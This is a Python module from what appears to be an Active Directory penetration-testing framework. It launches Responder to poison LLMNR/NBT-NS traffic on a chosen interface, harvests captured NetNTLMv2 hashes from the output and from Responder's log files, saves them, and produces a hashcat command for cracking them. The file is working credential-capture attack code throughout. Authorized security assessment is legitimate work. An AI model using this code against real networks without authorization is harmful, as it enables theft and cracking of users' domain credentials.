"""
responder_module.py - LLMNR/NBT-NS Poisoning module for AD-Pathfinder.

Runs Responder to capture NetNTLMv2 hashes via LLMNR/NBT-NS poisoning.
Operator must supply the network interface. The process runs interactively
and Responder writes captured hashes to its own log directory.

Tools used:
    - responder  (apt install responder)

Commands (from playbook):
    sudo responder -I eth0
    hashcat -m 5600 hash-netNTLM.txt <wordlist>
"""

from __future__ import annotations

import os
import re
import subprocess
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

# Responder log lines containing captured hashes look like:
#   [SMB] NTLMv2-SSP-Hash    : DOMAIN\user::...
HASH_RE = re.compile(
    r"NTLMv2-SSP-Hash\s*:\s*(.+)", re.IGNORECASE
)


def _detect_responder(executor: CommandExecutor) -> bool:
    return executor.check_tool("responder")


def _save_hash_file(hashes: list[str], assessment_id: str) -> str:
    os.makedirs("reports", exist_ok=True)
    path = os.path.join("reports", f"{assessment_id}-netntlm.txt")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(hashes) + "\n")
    return os.path.abspath(path)


def _crack_command(hash_file: str) -> str:
    return (
        f"hashcat -m 5600 {hash_file} /path/to/wordlist.txt"
    )


# ─────────────────────────────────────────────────────────────────────────────
# ResponderModule
# ─────────────────────────────────────────────────────────────────────────────

class ResponderModule:
    """
    LLMNR/NBT-NS poisoning via Responder.

    Runs 'sudo responder -I <interface>' interactively. Operator presses
    Ctrl+C to stop. Any captured NetNTLMv2 hashes are saved to
    reports/<assessment_id>-netntlm.txt.

    NOTE: This requires root/sudo and a suitable network position
    (same broadcast domain as the victims).
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Launch Responder interactively.

        Returns
        -------
        dict
            {
                "status":       "success" | "error" | "aborted",
                "hashes":       list[str],   # captured NetNTLMv2 hashes
                "hash_file":    str | None,
                "crack_command":str,
                "error":        str | None,
                "warnings":     list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        if not _detect_responder(self.executor):
            return self._error(
                "responder not found on PATH. Install: sudo apt install responder"
            )

        # ── Prompt for interface ──────────────────────────────────────────
        console.print()
        console.print(
            "  [bold yellow]⚠  Responder runs interactively.[/bold yellow]\n"
            "  [dim]Press Ctrl+C when done capturing. Hashes will be saved automatically.[/dim]\n"
        )
        iface = Prompt.ask(
            "  [bold yellow]Network interface[/bold yellow] [dim](e.g. eth0, tun0)[/dim]",
            default="eth0",
        )

        cmd = ["sudo", "responder", "-I", iface]
        cmd_str = " ".join(cmd)

        console.print(
            f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{cmd_str}[/dim]\n"
        )
        console.print(
            "  [dim]Waiting for LLMNR/NBT-NS queries... Press Ctrl+C to stop.[/dim]\n"
        )

        captured_output_lines: list[str] = []

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )

            for line in iter(proc.stdout.readline, ""):  # type: ignore[union-attr]
                print(line, end="", flush=True)
                captured_output_lines.append(line)

            proc.wait()

        except KeyboardInterrupt:
            # Operator stopped Responder — normal flow
            try:
                proc.terminate()
            except Exception:
                pass
            console.print("\n\n  [bold yellow]Responder stopped by operator.[/bold yellow]\n")

        except FileNotFoundError:
            return self._error("sudo or responder not found. Check PATH and sudo access.")

        # ── Parse captured hashes from piped output ───────────────────────
        full_output = "".join(captured_output_lines)
        hashes = [m.group(1).strip() for m in HASH_RE.finditer(full_output)]

        # Also scan Responder's own log files (default location)
        responder_log_dir = "/usr/share/responder/logs"
        if os.path.isdir(responder_log_dir):
            for fname in os.listdir(responder_log_dir):
                if "NTLMv2" in fname and fname.endswith(".txt"):
                    fpath = os.path.join(responder_log_dir, fname)
                    try:
                        with open(fpath, "r", errors="replace") as fh:
                            for line in fh:
                                line = line.strip()
                                if line and line not in hashes:
                                    hashes.append(line)
                    except OSError:
                        pass
        else:
            warnings.append(
                "Could not read Responder log dir (/usr/share/responder/logs). "
                "Check there manually for captured hashes."
            )

        # ── Deduplicate + save ────────────────────────────────────────────
        hashes = list(dict.fromkeys(hashes))  # preserve order, deduplicate
        hash_file: Optional[str] = None

        if hashes:
            hash_file = _save_hash_file(hashes, state.assessment_id)
            # Store in state
            for h in hashes:
                entry = {
                    "type":     "netntlmv2",
                    "username": h.split("::")[0] if "::" in h else "unknown",
                    "hash":     h,
                    "spn":      "",
                }
                if entry not in state.hashes:
                    state.hashes.append(entry)

            state.log_finding(
                "LLMNR Poisoning",
                f"Captured {len(hashes)} NetNTLMv2 hash(es) via Responder.",
                severity="HIGH",
            )
        else:
            warnings.append("No NetNTLMv2 hashes captured during this session.")

        crack_cmd = _crack_command(hash_file or "netntlm-hashes.txt")
        state.log_action("LLMNR/NBT-NS Poisoning (Responder)")

        return {
            "status":        "success",
            "hashes":        hashes,
            "hash_file":     hash_file,
            "crack_command": crack_cmd,
            "error":         None,
            "warnings":      warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":        "error",
            "hashes":        [],
            "hash_file":     None,
            "crack_command": "",
            "error":         message,
            "warnings":      [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.responder_module import run as responder_run
    result = responder_run(state)
    """
    return ResponderModule(executor).run(state)
